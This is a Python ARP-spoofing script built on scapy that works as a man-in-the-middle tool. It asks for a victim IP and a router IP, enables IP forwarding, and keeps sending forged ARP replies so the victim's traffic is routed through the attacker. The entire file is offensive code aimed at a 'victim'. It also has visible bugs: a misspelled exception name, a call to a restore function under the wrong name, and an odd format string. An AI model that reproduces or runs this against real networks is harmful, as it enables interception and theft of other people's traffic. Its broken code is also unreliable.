from scapy.all import *
from uuid import getnode as get_mac
import sys
import os
import time

try:
    interface = input("[*] Enter described interface:")
    victimIP = input("[*] Enter victim IP:")
    gateIP = input("[*] Enter Router IP:")

except KEYboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("\n[*] Exiting")
    sys.exit(1)

print("\n[*] Enabling IP forwarding ..\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    conf.verb = 0
    ans, uans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP),timeout= 2,iface = interface,inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf("r %ether.src%")


def reArp():
    print("\n[*] Restoring Targets...")
    victimMAC=get_mac(victimIP)
    gateMAC=get_mac(gateIP)
    send(ARP(op=2,pdst=gateIP,psrc=victimIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimMAC),count=7)
    send(ARP(op=2,pdst=victimIP,psrc=gateIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateMAC),count=7)
    print("[*] Disabling IP frowarding ...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting down...")
    sys.exit(1)

def trick(gm,vm):
    send(ARP(op = 2,pdst = victimIP,psrc = gateIP,hwdst = vm))
    send(ARP(op = 2,pdst = gateIP,psrc = victimIP,hwdst = gm))




def mitm():
    try:
        victimMAC=get_mac(victimIP)
        print(victimMAC)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find victim MAC address")
        print("[!]Exiting...")
        sys.exit(1)
    try:
        gateMAC=get_mac(gateIP)
    except Exception :
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldnt find gateway MAC Address")
        print("[!] Exiting..")
        sys.exit(1)
    print("[*] poisoning targets...")
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

mitm()
